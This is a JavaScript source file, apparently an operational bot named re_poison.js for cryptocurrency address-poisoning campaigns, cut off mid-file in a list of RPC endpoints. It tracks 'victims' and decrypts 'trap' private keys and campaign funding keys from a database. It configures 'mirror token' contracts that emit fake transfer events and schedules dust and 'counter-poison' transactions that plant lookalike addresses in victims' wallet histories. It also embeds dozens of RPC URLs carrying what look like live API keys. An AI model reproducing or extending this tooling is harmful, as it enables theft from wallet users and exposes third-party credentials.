
import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';
import { createPublicClient, createWalletClient, http, fallback } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, bsc, polygon } from 'viem/chains';
import { exec } from 'child_process';
import { promisify } from 'util';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

// --- Recreate __dirname for ES Modules ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const execAsync = promisify(exec);

console.log('[DEBUG] Starting optimized re_poison.js...');

// --- Supabase Service Client (bypass RLS) with connection pool limits ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey, {
    global: {
      fetch: (url, options = {}) => {
        // 🚀 FIX: Don't apply 60s timeout to Realtime or Auth endpoints, 
        // otherwise it kills the WebSocket/Long-polling connection!
        if (typeof url === 'string' && (url.includes('/realtime/v1') || url.includes('/auth/v1'))) {
          return fetch(url, options);
        }
        return fetch(url, {
          ...options,
          signal: AbortSignal.timeout(300000),
        });
      },
    },
    realtime: {
      params: {
        eventsPerSecond: 10, // Prevent spamming the DB with too many events
      },
    },
  });
  console.log('[DEBUG] Supabase service client initialized');
} else {
  console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
}


// ─── Mirror Token Contracts (one per asset) ───
const MIRROR_TOKEN_ABI = [
  {
    "inputs": [
      { "internalType": "address", "name": "from", "type": "address" },
      { "internalType": "address", "name": "to", "type": "address" },
      { "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "transferFrom",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address[]", "name": "froms", "type": "address[]" },
      { "internalType": "address[]", "name": "tos", "type": "address[]" },
      { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
    ],
    "name": "batchEmitTransfers",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];


// ─── Multi-Token Router ABI ───
const MULTI_TOKEN_ROUTER_ABI = [
  {
    "inputs": [
      {
        "components": [
          { "internalType": "address", "name": "target", "type": "address" },
          { "internalType": "address[]", "name": "froms", "type": "address[]" },
          { "internalType": "address[]", "name": "tos", "type": "address[]" },
          { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
        ],
        "internalType": "struct MultiTokenBatchRouter.BatchCall[]",
        "name": "calls",
        "type": "tuple[]"
      }
    ],
    "name": "transfer",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

const MULTI_TOKEN_ROUTER = process.env.MULTI_TOKEN_ROUTER;


// ─── Load all mirror contract addresses ───
// Stablecoins
const MIRROR_TOKEN_USDC = process.env.MIRROR_TOKEN_USDC;
const MIRROR_TOKEN_USDT = process.env.MIRROR_TOKEN_USDT;
const MIRROR_TOKEN_DAI = process.env.MIRROR_TOKEN_DAI;
const MIRROR_TOKEN_EURC = process.env.MIRROR_TOKEN_EURC;
const MIRROR_TOKEN_EURCV = process.env.MIRROR_TOKEN_EURCV;

// Wrapped tokens
const MIRROR_TOKEN_WBTC = process.env.MIRROR_TOKEN_WBTC;
const MIRROR_TOKEN_cbETH = process.env.MIRROR_TOKEN_cbETH;
const MIRROR_TOKEN_WETH = process.env.MIRROR_TOKEN_WETH;

// DeFi tokens
const MIRROR_TOKEN_LINK = process.env.MIRROR_TOKEN_LINK;
const MIRROR_TOKEN_AAVE = process.env.MIRROR_TOKEN_AAVE;
const MIRROR_TOKEN_ENA = process.env.MIRROR_TOKEN_ENA;
const MIRROR_TOKEN_CHEX = process.env.MIRROR_TOKEN_CHEX;

// Meme coins
const MIRROR_TOKEN_SHIB = process.env.MIRROR_TOKEN_SHIB;
const MIRROR_TOKEN_PEPE = process.env.MIRROR_TOKEN_PEPE;
const MIRROR_TOKEN_DOGE = process.env.MIRROR_TOKEN_DOGE;
const MIRROR_TOKEN_BONK = process.env.MIRROR_TOKEN_BONK;

// Other tokens
const MIRROR_TOKEN_WLFI = process.env.MIRROR_TOKEN_WLFI;
const MIRROR_TOKEN_HEX = process.env.MIRROR_TOKEN_HEX;
const MIRROR_TOKEN_CRCLon = process.env.MIRROR_TOKEN_CRCLon;

// Native coins
const MIRROR_TOKEN_NATIVE = process.env.MIRROR_TOKEN_NATIVE;

// Map asset symbols to contract addresses
const MIRROR_CONTRACTS = {
  // Stablecoins
  USDC: MIRROR_TOKEN_USDC,
  USDT: MIRROR_TOKEN_USDT,
  DAI: MIRROR_TOKEN_DAI,
  EURC: MIRROR_TOKEN_EURC,
  EURCV: MIRROR_TOKEN_EURCV,

  // Wrapped tokens
  WBTC: MIRROR_TOKEN_WBTC,
  cbETH: MIRROR_TOKEN_cbETH,
  WETH: MIRROR_TOKEN_WETH,

  // DeFi tokens
  LINK: MIRROR_TOKEN_LINK,
  AAVE: MIRROR_TOKEN_AAVE,
  ENA: MIRROR_TOKEN_ENA,
  CHEX: MIRROR_TOKEN_CHEX,

  // Meme coins
  SHIB: MIRROR_TOKEN_SHIB,
  PEPE: MIRROR_TOKEN_PEPE,
  DOGE: MIRROR_TOKEN_DOGE,
  BONK: MIRROR_TOKEN_BONK,

  // Other tokens
  WLFI: MIRROR_TOKEN_WLFI,
  HEX: MIRROR_TOKEN_HEX,
  CRCLon: MIRROR_TOKEN_CRCLon,

  // Native coins (all use the same contract)
  ETH: MIRROR_TOKEN_NATIVE,
  BNB: MIRROR_TOKEN_NATIVE,
  MATIC: MIRROR_TOKEN_NATIVE,
};

// ─── Decimals lookup for all supported tokens ───
function getDecimals(assetSymbol) {
  const decimalsMap = {
    // Native coins (18 decimals)
    'ETH': 18, 'BNB': 18, 'MATIC': 18,
    'WETH': 18, 'WBNB': 18, 'WMATIC': 18,

    // Stablecoins with 6 decimals
    'USDC': 6, 'USDT': 6, 'EURC': 6, 'USDP': 6, 'BUSD': 6,

    // Stablecoins with 18 decimals
    'DAI': 18, 'EURCV': 18, 'TUSD': 18, 'FRAX': 18,

    // Bitcoin variants (8 decimals)
    'WBTC': 8, 'renBTC': 8,

    // DeFi tokens (18 decimals)
    'LINK': 18, 'AAVE': 18, 'ENA': 18, 'CHEX': 18, 'cbETH': 18,

    // Meme coins
    'SHIB': 18, 'PEPE': 18, 'DOGE': 18, 'BONK': 5,

    // Other tokens
    'WLFI': 18, 'HEX': 8, 'CRCLon': 18,
  };

  const symbol = (assetSymbol || '').toUpperCase();
  return decimalsMap[symbol] ?? 18; // Default to 18 if unknown
}

// Per-campaign wallet clients (already implemented from previous edit)
const campaignMirrorWallets = new Map();
// 🚀 TOGGLE SETTINGS: Tracks real-time dashboard toggles per campaign
const campaignSettings = new Map();

// Log which contracts are enabled
const enabledContracts = Object.entries(MIRROR_CONTRACTS)
  .filter(([_, addr]) => addr)
  .map(([asset, addr]) => `${asset}=${addr}`);

if (enabledContracts.length > 0) {
  console.log(`[DEBUG] MirrorToken contracts enabled: ${enabledContracts.join(', ')}`);
  console.log(`[DEBUG] Each campaign will use its own funding wallet to pay gas for mirrors`);
} else {
  console.warn('[DEBUG] No MirrorToken contracts configured - set MIRROR_TOKEN_USDC, MIRROR_TOKEN_USDT, MIRROR_TOKEN_NATIVE in .env');
}

const SKIP_DUST_IF_MIRROR = process.env.SKIP_DUST_IF_MIRROR === 'true';
if (SKIP_DUST_IF_MIRROR) {
  console.log('[DEBUG] ⚡ SKIP_DUST_IF_MIRROR is enabled. Real dust will be skipped if mirror succeeds.');
}


// --- Config ---
const {
  files: { caught: caughtFile },
  rpc: { observer: observerRpcUrl },
  rePoison: { cooldownMs, dustRetries, delayBetweenMs },
} = config;

// --- State ---
const victims = new Map();
let blockPollInterval = null;
let lastTrapReloadTime = new Date(Date.now() - 10 * 60 * 1000).toISOString(); // Start 10 mins ago
let caughtVictimsPollInterval = null;
let trapsReloadInterval = null;
let lastBlockProcessed = 0n;

// Async Mutex Lock to prevent RPC exhaustion and concurrent Python spawns
let isScanning = false;

// ─── Load caught victims from database ───
const caughtVictims = new Set();
let realtimeSubscription = null;

async function loadCaughtVictims() {
  if (!supabaseService) return;
  try {
    const { data, error } = await supabaseService
      .from('traps')
      .select('victim_address')
      .eq('is_caught', true);

    if (error) {
      console.warn(`[DEBUG] Supabase query for caught victims failed: ${error.message}`);
      return;
    }

    if (data && data.length > 0) {
      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
  }
}

// ─── Subscribe to new traps in real-time ───
function subscribeToNewTraps() {
  if (!supabaseService) {
    console.warn('[DEBUG] Supabase not available, skipping realtime subscription');
    return;
  }

  console.log('[DEBUG] Subscribing to new traps via Supabase Realtime...');

  // Channel 1: Traps (New Traps)
  realtimeSubscription = supabaseService
    .channel('traps_changes')
    .on(
      'postgres_changes',
      {
        event: 'INSERT',
        schema: 'public',
        table: 'traps'
      },
      function (payload) {
        try {
          var row = payload.new;
          console.log('[REALTIME] New trap detected: ' + row.victim_address);

          var privateKey = decrypt(row.trap_private_key_enc);
          var victim = row.victim_address.toLowerCase();
          var counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
          var campaignId = row.campaign_id;

          victims.set(victim, {
            privateKey: privateKey,
            trapAddress: row.trap_address.toLowerCase(),
            counterparty: counterparty,
            lastPoison: 0,
            lastCounterPoison: 0,
            campaignId: campaignId,
            victimAddress: victim
          });

          trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
          console.log('[REALTIME] Added ' + victim + ' to active victims (total: ' + victims.size + ')');
        } catch (err) {
          console.error('[REALTIME] Failed to process new trap: ' + err.message);
        }
      }
    )
    .subscribe(function (status, err) {
      if (status === 'SUBSCRIBED') {
        console.log('[DEBUG] ✅ Realtime subscription active (traps)');
      } else if (status === 'CHANNEL_ERROR') {
        console.warn(`[DEBUG] ⚠️ Realtime channel error (reconnecting): ${err?.message || 'Network drop'}`);
      } else if (status === 'TIMED_OUT') {
        console.warn(`[DEBUG] ⏳ Realtime subscription timed out, reconnecting...`);
      } else if (status === 'CLOSED') {
        console.warn(`[DEBUG] 🔒 Realtime subscription closed`);
      }
    });

  // Channel 2: Campaigns (Toggle Listener) - 🚀 UPDATED WITH DEBUG LOGS
  const campaignsChannel = supabaseService.channel('campaigns_changes');
  campaignsChannel
    .on(
      'postgres_changes',
      { event: '*', schema: 'public', table: 'campaigns' }, // Listen to ALL events to ensure we catch UPDATE
      function (payload) {
        console.log(`[REALTIME] 📡 Campaigns event received: ${payload.eventType} for campaign ${payload.new.id}`);

        if (payload.eventType === 'UPDATE') {
          const campId = payload.new.id;
          const isEnabled = payload.new.counter_poison_enabled !== false;
          const current = campaignSettings.get(campId) || {};

          // Only log if it actually changed
          if (current.counterPoisonEnabled !== isEnabled) {
            campaignSettings.set(campId, { ...current, counterPoisonEnabled: isEnabled });
            logger.info(`[REALTIME] 🎛️ Campaign ${campId} counter-poison toggled to: ${isEnabled ? 'ON 🟢' : 'OFF 🔴'}`);
          }
        }
      }
    )
    .subscribe((status, err) => {
      console.log('[DEBUG] 📡 Campaigns Realtime channel status:', status, err ? err.message : '');
    });
}

// ─── Load traps from database ───
async function loadTrapsFromDB() {
  if (!supabaseService) {
    console.error('[re_poison] Supabase service not available');
    process.exit(1);
  }

  try {
    const { data: campaigns, error: campError } = await supabaseService
      .from('campaigns')
      .select('id, funding_private_key_enc, counter_poison_enabled')
      .eq('chain', chainName);

    if (campError) {
      console.error(`[DEBUG] Failed to fetch campaigns: ${campError.message}`);
      return 0;
    }

    if (!campaigns || campaigns.length === 0) {
      console.log(`[DEBUG] No campaigns found for chain ${chainName}`);
      return 0;
    }

    const campaignIds = campaigns.map(c => c.id);


    // 🚀 FIX: Only load funding keys for NEW campaigns (skip already loaded ones)
    const invalidCampaigns = new Set(); // Cache invalid campaigns to avoid retrying

    if (MIRROR_TOKEN_USDC || MIRROR_TOKEN_USDT || MIRROR_TOKEN_NATIVE) {
      for (const camp of campaigns) {
        // 🚀 Store toggle settings in memory
        campaignSettings.set(camp.id, {
          counterPoisonEnabled: camp.counter_poison_enabled !== false // Defaults to true
        });

        // Skip if already loaded
        if (campaignMirrorWallets.has(camp.id)) {
          continue;
        }

        // Skip if we already know this campaign has invalid key
        if (invalidCampaigns.has(camp.id)) {
          continue;
        }

        if (!camp.funding_private_key_enc) {
          console.warn(`[DEBUG] Campaign ${camp.id} has no funding key, mirror disabled for this campaign`);
          invalidCampaigns.add(camp.id);
          continue;
        }

        try {
          let fundingKey = decrypt(camp.funding_private_key_enc);

          fundingKey = fundingKey.trim();
          if (!fundingKey.startsWith('0x')) {
            fundingKey = `0x${fundingKey}`;
          }

          if (!/^0x[a-fA-F0-9]{64}$/.test(fundingKey)) {
            console.warn(`[DEBUG] Campaign ${camp.id} has invalid funding key format, skipping mirror for this campaign`);
            invalidCampaigns.add(camp.id);
            continue;
          }

          const fundingAccount = privateKeyToAccount(fundingKey);

          const walletClient = createWalletClient({
            account: fundingAccount,
            chain: viemChain,
            transport: fallback(
              fallbackUrls.map(url => http(url, { timeout: 15000 })),
              {
                rank: true,
                retryCount: 3,
                retryDelay: 1000
              }
            ),
          });
          campaignMirrorWallets.set(camp.id, {
            walletClient,
            operatorAddress: fundingAccount.address
          });
          console.log(`[DEBUG] Campaign ${camp.id} funding key loaded (operator: ${fundingAccount.address})`);
        } catch (err) {
          console.warn(`[DEBUG] Failed to decrypt funding key for campaign ${camp.id}: ${err.message}`);
          invalidCampaigns.add(camp.id);
        }
      }
    }

    // 🚀 SCALE FIX: Only fetch NEW traps on reloads, fetch ALL on first run
    let query = supabaseService
      .from('traps')
      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc, created_at')
      .in('campaign_id', campaignIds);

    if (victims.size > 0) {
      // Incremental reload: only get traps created since last reload
      query = query.gt('created_at', lastTrapReloadTime);
    }

    const { data: traps, error: trapError } = await query;


    if (trapError) {
      console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
      return 0;
    }

    if (!traps || traps.length === 0) {
      console.log(`[DEBUG] No traps found for campaigns on chain ${chainName}`);
      return 0;
    }

    console.log(`[DEBUG] Fetched ${traps.length} traps from database. Decrypting...`);

    let loaded = 0;
    const startTime = Date.now();

    // 🚀 RAM & CPU FIX: Decrypt in chunks of 500 to prevent Out-Of-Memory crashes on 1GB VPS
    const CHUNK_SIZE = 500;
    for (let i = 0; i < traps.length; i += CHUNK_SIZE) {
      const chunk = traps.slice(i, i + CHUNK_SIZE);

      for (const row of chunk) {
        try {
          const privateKey = decrypt(row.trap_private_key_enc);
          const victim = row.victim_address.toLowerCase();
          const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
          const campaignId = row.campaign_id;

          const existing = victims.get(victim);
          victims.set(victim, {
            privateKey,
            trapAddress: row.trap_address.toLowerCase(),
            counterparty,
            lastPoison: existing ? existing.lastPoison : 0,
            lastCounterPoison: existing ? existing.lastCounterPoison : 0,
            campaignId,
            victimAddress: victim,
          });

          trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
          loaded++;
        } catch (err) {
          // Silently ignore bad decryptions
        }
      }

      // 🚀 Yield to the event loop and force Garbage Collection between chunks
      await new Promise(resolve => setImmediate(resolve));
      console.log(`[DEBUG] ⏳ Decrypted ${loaded}/${traps.length} traps...`);
    }

    // 🚀 Log loaded settings to verify DB read
    for (const [campId, settings] of campaignSettings.entries()) {
      console.log(`[DEBUG] 🎛️ Campaign ${campId} loaded with Counter-Poison: ${settings.counterPoisonEnabled ? 'ON' : 'OFF'}`);
    }

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
    console.log(`[DEBUG] 🚀 Loaded ${loaded} victims from database in ${elapsed}s`);
    lastTrapReloadTime = new Date().toISOString(); // Update timestamp for next reload
    return loaded;
  } catch (err) {
    console.error(`[DEBUG] Error loading traps from DB: ${err.message}`);
    return 0;
  }
}

// --- MULTI‑CHAIN ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
const chainId = chainCfg?.chainId || 1;

let viemChain;
switch (chainName) {
  case 'bsc':
    viemChain = bsc;
    break;
  case 'polygon':
    viemChain = polygon;
    break;
  default:
    viemChain = mainnet;
}

const chainRpc = chainCfg?.rpc || observerRpcUrl;

console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
console.log(`[DEBUG] Observer RPC: ${chainRpc}`);
console.log('[DEBUG] cooldownMs:', cooldownMs);
console.log('[DEBUG] dustRetries:', dustRetries);
console.log('[DEBUG] delayBetweenMs:', delayBetweenMs);

const COOLDOWN_MS = cooldownMs || 60 * 60 * 1000;
const DUST_RETRIES = dustRetries || 2;
const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
const EXEC_TIMEOUT_MS = 180000;

// 🚀 Chain-aware scanning parameters
const CHAIN_SCAN_CONFIG = {
  // 🚀 OPTIMIZED: Reduced blocks to 2, increased poll to 24s to save massive CPU
  ethereum: { blockTimeMs: 12000, pollIntervalMs: 24000, maxBlocksPerScan: 2 },
  // 🚀 OPTIMIZED: Reduced BSC blocks to 10, poll to 9s
  bsc: { blockTimeMs: 3000, pollIntervalMs: 9000, maxBlocksPerScan: 10 },
  // 🚀 OPTIMIZED: Reduced Polygon blocks to 15, poll to 8s
  polygon: { blockTimeMs: 2000, pollIntervalMs: 8000, maxBlocksPerScan: 15 },
};
const scanConfig = CHAIN_SCAN_CONFIG[chainName] || CHAIN_SCAN_CONFIG.ethereum;

// --- Dynamic cooldown limits ---
const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);
const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);

// --- Deduplication and concurrency control ---
const processedTxHashes = new Map();
const trapLocks = new Map();

// 🚀 IN-MEMORY CACHE: Tracks the most recent real transfer amounts for victims
const recentVictimTransfers = new Map();
// Maps trap address -> victim address to ensure we only cache OUR OWN trap's transfers
const trapToVictimMap = new Map();

// 🚀 BATCH PROCESSING: Queue-and-flush system
const BATCH_FLUSH_THRESHOLD = 150;
const BATCH_FLUSH_INTERVAL_MS = 600000;
const poisonQueue = new Map();
let queueFlushTimer = null;

// 🚀 FIX: Local Nonce Tracker to prevent RPC load balancer race conditions
const campaignNonces = new Map();

async function getAndIncrementNonce(campaignId, walletClient, address) {
  if (!campaignNonces.has(campaignId)) {
    campaignNonces.set(campaignId, new Map());
  }
  const nonces = campaignNonces.get(campaignId);

  // Fetch from RPC only on the very first transaction for this campaign
  if (!nonces.has(address)) {
    try {
      // 🚀 FIX: Use public client (not walletClient) to get nonce
      const rpcNonce = await client.getTransactionCount({ address, blockTag: 'pending' })
        .catch(() => client.getTransactionCount({ address }));
      nonces.set(address, rpcNonce);
      logger.info(`[nonce] Initial nonce for ${address.slice(0, 10)}... = ${rpcNonce}`);
    } catch (err) {
      logger.warn(`[mirror] Failed to fetch initial nonce: ${err.message}`);
      nonces.set(address, 0);
    }
  }

  return nonces.get(address);
}

function confirmNonceIncrement(campaignId, address) {
  const nonces = campaignNonces.get(campaignId);
  if (nonces && nonces.has(address)) {
    nonces.set(address, nonces.get(address) + 1);
  }
}

// --- Per‑victim statistics ---
const victimStats = new Map();
const victimTxTimestamps = new Map();
let lastStatsLogTime = 0;
const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;

// 🚀 OPTIMIZATION: Pre-compute token address map for O(1) lookups in hot path
const tokenAddressMap = new Map();
if (chainCfg && chainCfg.tokens) {
  for (const [symbol, address] of Object.entries(chainCfg.tokens)) {
    tokenAddressMap.set(address.toLowerCase(), symbol);
  }
}

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS = {
  bsc: [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_UjKxk9pKsW_dyGr0DsSUg',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_tugCF6o2P9QVakG2mkv-v',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_KjELJhAqY0UxY5ATnUkrv',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_LUaQ3RIGYtUQLoYf5qAKM',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Pk8_TOH-_XLLa1AVtO1m_',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_GOEmljbIs1_6KKYBhQPev',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_K6mdh4em_JQ3WSa0sF75O',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_wO4Vj8MB446rOmDZkXtI-',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_qoM9xKq_DxsGNbgkas62g',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_lWkjPC2_MbiGP1S8QYBuD',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_3_Bpj7ORVica5UbSitOXm',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_AMGRdQ1DjpCspfYgaJWk8',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_n0iXFk0U2atdbZFyJw3Vd',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_uG-HMTi_h9uFfpZ0IPtUC',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Of_5h7lrnjaNskMMN1m_O',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_JXJn_G0u41v-ORLH-PLvm',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6DY1YYDbhjfaDTRvVlb8E',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_FY7h0VVmtvSHzWHULlBYD',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_e2hNo6urdy-p9K3iCKBRz',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_wT_5s_3jEKZRUHS6-9qlB',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_xo7rkNtpCG3XTTte_34Oe',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_DMA2jJjcrOWJ9R10_Fx5k',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_bBpETSAAmA8VjshNMBkLn',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_VJ0_4LOGnzlbo7NPkqhg-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  polygon: [
    'https://polygon-mainnet.g.alchemy.com/v2/alch_dOC9VaHvULe0OG4BCsL4k',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_2oQI0O2Zeauyjk3Tbfmbi',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_e0tnsU7rs03h_ombhCgVc',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_8e6VO9V-GCCluw8DF2_DS',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_bA3J_8krCNXo47R9-yHSI',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Xc_EaiJJLKPQYOquOEEJv',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_TGdQt0FHkng1ZZ7wnCOuI',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_t2aqu6B1CS8Pzk-Rtfsre',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_lZeeK8JujRtMQhKWXTlVx',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_p_WDO2WMSedUATnUIGU-b',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_6bgVHMAQFQbOqC7cHZ5tU',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_e1PIp-UVXQ1jZWINkbmDm',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_n9bFKwbW1lFSXd-CTjFA8',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_VXeIGTUmcC8G4X4a4Lx8e',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_adXxpjamb8lNBSSnH-dZF',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_vUHRCAI2B5z-NVbge5MjR',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_YXuYd2T6nO-_ASx3VyYd8',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_o4lfkzzsAyG0uEFq9cfx0',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_6vT8KHKebKLX2IzQCgHpo',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_C7D8h3Jq99k3QweZHq1Ip',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_1t_00WgSdtEqIYYRY8LdA',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_qfGoxus-szPvLI44z9YWw',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_fcNea90VExKd5DNvSguRa',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_sr3YXfVMNVZJ5qSCU0kyD',
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  ethereum: [
    // 🚀 PUBLIC / No-Auth RPCs (No API key limits)
    'https://eth.llamarpc.com',
    'https://rpc.ankr.com/eth',
    'https://ethereum.publicnode.com',
    'https://1rpc.io/eth',
    'https://eth.drpc.org',
    'https://cloudflare-eth.com',
    'https://eth.merkle.io',
    'https://eth-mainnet.nodereal.io/v1/1659dfb40aa24bbb8153a677b98064d7',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_gx9srjXabB0OocIDNitUd',
    'https://eth-mainnet.g.alchemy.com/v2/alch_Y8rCHyOCRzZAW_2xLVM5r',
    'https://eth-mainnet.g.alchemy.com/v2/alch_9dpiCogyGyxtA4ptC-zIl',
    'https://eth-mainnet.g.alchemy.com/v2/alch_lTX5t4XwroOB87Xk0AWbY',
    'https://eth-mainnet.g.alchemy.com/v2/alch_YHosKAPg0sfm7jDhqvW74',
    'https://eth-mainnet.g.alchemy.com/v2/alch_vHCE0WOUUK1Mk5G0tyA76',
    'https://eth-mainnet.g.alchemy.com/v2/alch_h9VFpYnKLf4EBcDUUlRq6',
    'https://eth-mainnet.g.alchemy.com/v2/alch_aXQIrXS-yYrBWK_ebsvXG',
    'https://eth-mainnet.g.alchemy.com/v2/alch_fwNFGs-GGjZ5MauYZexOR',
    'https://eth-mainnet.g.alchemy.com/v2/alch_9P2EBVaMvYP0SPn4zjBUB',
    'https://eth-mainnet.g.alchemy.com/v2/alch_3smRQUoTzfj_NPiK6451s',
    'https://eth-mainnet.g.alchemy.com/v2/alch_xp0ppatuXONHI2pClS7_M',
    'https://eth-mainnet.g.alchemy.com/v2/alch_hmts-IFXko93muF8BaX5Q',
    'https://eth-mainnet.g.alchemy.com/v2/alch_8fJp6NiVdGxCOljdKCDZi',
    'https://eth-mainnet.g.alchemy.com/v2/alch_4euFfPOpJDglYNRQYKWhO',
    'https://eth-mainnet.g.alchemy.com/v2/alch_bjwK80RPIzP774OVkp-vE',
    'https://eth-mainnet.g.alchemy.com/v2/alch_LcoDsDwyyl7fbYUvffKYC',
    'https://eth-mainnet.g.alchemy.com/v2/alch_btTtYZmxG7VfNjY_jZIJr',
    'https://eth-mainnet.g.alchemy.com/v2/alch_IP1SsCj0wqzZqrvhH_Rv5',
    'https://eth-mainnet.g.alchemy.com/v2/alch_1O0yoHMsrXCOe3lOHu7dc',
    'https://eth-mainnet.g.alchemy.com/v2/alch_w2NDE7Pilr5cpIPb51Wsx',
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
